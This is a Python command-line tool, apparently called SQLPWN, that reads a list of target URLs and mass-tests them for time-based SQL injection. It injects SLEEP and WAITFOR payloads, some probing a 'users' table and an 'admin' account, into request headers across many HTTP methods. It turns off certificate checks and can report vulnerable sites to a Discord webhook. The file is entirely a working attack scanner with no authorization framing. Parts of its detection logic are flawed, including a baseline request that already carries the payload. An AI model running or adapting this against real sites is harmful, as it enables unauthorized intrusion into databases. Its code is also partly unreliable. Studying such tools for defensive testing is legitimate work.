import requests
import argparse
import time
import random
import urllib3
from datetime import datetime
from colorama import Fore, Style, init
from prettytable import PrettyTable
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SQL Injection Scanner Configuration
DISCORD_WEBHOOK = ""  # <-- Put your Discord webhook here if you want
PROXIES = {
    # "http": "http://127.0.0.1:8080",
    # "https": "http://127.0.0.1:8080"
}

# Expanded example payloads for time-based SQLi
payloads = [
    "1 OR IF(1=1, SLEEP(5), 0)",         # True condition, should sleep for 5 seconds
    "1 OR IF(1=2, SLEEP(5), 0)",         # False condition, should not sleep
    "1; IF (SUBSTRING(@@version, 1, 1) = 5, SLEEP(5), 0)",  # Check if database version starts with 5
    "1 OR IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)",  # Check if user table exists
    "1 OR IF((SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END), 0)",  # Use CASE for conditional delay
    "1; WAITFOR DELAY '00:00:05'",       # SQL Server specific delay command
    "1 OR (SELECT SLEEP(5))",             # Simple payload to see if it sleeps
    "1 AND IF(1=1, SLEEP(5), 0)",         # Another IF condition
    "1 OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND SLEEP(5))",  # Testing for admin user
    "1 OR IF((SELECT LENGTH(username) FROM users LIMIT 1) - (SELECT LENGTH('admin')), SLEEP(5), 0)",  # Check length of username
]

base_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "X-Forwarded-For": "192.168.1.1",
    "X-Client-IP": "192.168.1.1",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.5",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "DNT": "1",  # Do Not Track
    "Cookie": "sessionId=123456789; otherCookie=value",
    "Host": "example.com",
    "Origin": "https://example.com",
    "Referer": "https://example.com/index.html",
    "Upgrade-Insecure-Requests": "1",
    "X-CSRF-Token": "abc123xyz",
    "X-HTTP-Method-Override": "PATCH",
    "X-Powered-By": "PHP/7.4.3",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "TE": "Trailers",
    "If-Modified-Since": "Sat, 29 Oct 2023 19:43:31 GMT",
    "If-None-Match": "abcxyzetag",
    "Timeout": "300",
    "Authorization": "Bearer token_here",
    "X-Api-Key": "your_api_key_here",
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    "X-XSS-Protection": "1; mode=block",
    "X-UA-Compatible": "IE=edge",
    "Pragma": "no-cache",
    "Range": "bytes=0-",
}

headers_to_test = ["User-Agent", "X-Forwarded-For", "X-Client-IP"]
methods_to_test = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "PATCH"]

# TUI output table
results_table = PrettyTable()
results_table.field_names = ["URL", "Method", "Header", "Status"]

# ASCII splash banner
def display_banner():
    banner = r"""
	     	    YAao,
                    Y8888b,
                  ,oA8888888b,
            ,aaad8888888888888888bo,
         ,d888888888888888888888888888b,
       ,888888888888888888888888888888888b,
      d8888888888888888888888888888888888888,
     d888888888888888888888888888888888888888b
    d888888P'                    `Y888888888888,
    88888P'                    Ybaaaa8888888888l
   a8888'                      `Y8888P' `V888888
 d8888888a                                `Y8888
AY/'' `\Y8b                                 ``Y8b
Y'      `YP                                    ~~
         `'
	SQLPWN BY EL-HA9

      SQL Injection Scanner
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)

# Function to send Discord alerts
def send_discord_alert(url, method, header):
    if DISCORD_WEBHOOK:
        try:
            data = {
                "content": "🚨 **SQLi Vulnerable**\n**URL:** `%s`\n**Method:** `%s`\n**Injected Header:** `%s`" % (
                    url, method, header
                )
            }
            requests.post(DISCORD_WEBHOOK, json=data, proxies=PROXIES, verify=False)
        except Exception as e:
            print(Fore.YELLOW + "[!!] Discord alert failed: %s" % str(e) + Style.RESET_ALL)

def is_vulnerable(url, method, injected_header, payload,delay):
    try:
        headers = base_headers.copy()
        headers[injected_header] = payload

        # Parse the URL to extract parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        # To send a clean request without the payload
        if method in ["POST", "PUT", "PATCH"]:
            clean_response = requests.request(
                method, 
                f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}", 
                headers=headers,
                data=params,
                timeout=10, 
                verify=False, 
                proxies=PROXIES
            )
        else:
            clean_response = requests.request(
                method, 
                url, 
                headers=headers, 
                timeout=10, 
                verify=False, 
                proxies=PROXIES
            )

        # Now send the request with the payload
        headers[injected_header] = payload  # Update header with payload
        start_payload = time.time()
        payload_response = requests.request(
            method, 
            f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}", 
            headers=headers, 
            data=params, 
            timeout=10, 
            verify=False, 
            proxies=PROXIES
        )
        duration_payload = time.time() - start_payload

        # Compare duration of payload request to clean request
        if duration_payload > int(delay):  # Adjust this threshold as necessary
            return True, payload_response.status_code, method
        else:
            return False, clean_response.status_code, method
    except Exception:
        return False, None, method

def scan_url(url,delay):
    results = []
    random.shuffle(methods_to_test)

    for method in methods_to_test:
        random.shuffle(headers_to_test)
        
        for header in headers_to_test:
            current_payload = random.choice(payloads)
            print(f"  [*] Trying {method} with header {header} and payload '{current_payload}' on {url}...")

            vulnerable, status, used_method = is_vulnerable(url, method, header, current_payload,delay)

            if vulnerable:
                print(Fore.GREEN + f"  [!!] Vulnerable! {url} | Status: {status} | Method: {used_method} | Header: {header}" + Style.RESET_ALL)
                results.append((url, used_method, header, "Vulnerable"))
                send_discord_alert(url, used_method, header)
                break  # Exit after finding the first vulnerability
            else:
                color = Fore.RED if status else Fore.YELLOW
                print(color + f"  [--] Not vulnerable | Status: {status if status else 'Error/Timeout'}" + Style.RESET_ALL)

    return results

def main(file_path,delay):
    with open(file_path, 'r') as f:
        raw_urls = [line.strip() for line in f if line.strip()]

    urls = [line if line.startswith(("http://", "https://")) else f"https://{line}" for line in raw_urls]
    random.shuffle(urls)

    print("\n[+] Loaded %d targets. Starting scan...\n" % len(urls))

    # Using tqdm for the spinning progress bar
    with tqdm(total=len(urls), desc="Scanning URLs", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}", ncols=10) as progress_bar:
        with ThreadPoolExecutor(max_workers=5) as executor:  # Adjust the number of workers as needed
            future_to_url = {executor.submit(scan_url, url ,delay): url for url in urls}

            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    results = future.result()
                    for result in results:
                        results_table.add_row(result)
                except Exception as exc:
                    print(Fore.RED + f"[!!] URL {url} generated an exception: {exc}" + Style.RESET_ALL)
                
                # Update progress bar
                progress_bar.update(1)

    print("\n[+] Scan finished. Results:\n")
    print(results_table)

    # Save results to file
    with open(f"vulnerable_results_{datetime.now().strftime('%Y%m%d-%H%M%S')}.md", "w") as f:
        f.write(str(results_table))

if __name__ == "__main__":
    display_banner()  # Show the splash banner
    parser = argparse.ArgumentParser(description="Multi-Method SQLi Scanner with Improved Time-Based Logic and Progress Bar")
    parser.add_argument("-f", "--file", required=True, help="Path to file with target URLs")
    parser.add_argument("-d", "--delay", required=True, help="Delay Check")

    args = parser.parse_args()
    main(args.file,args.delay)
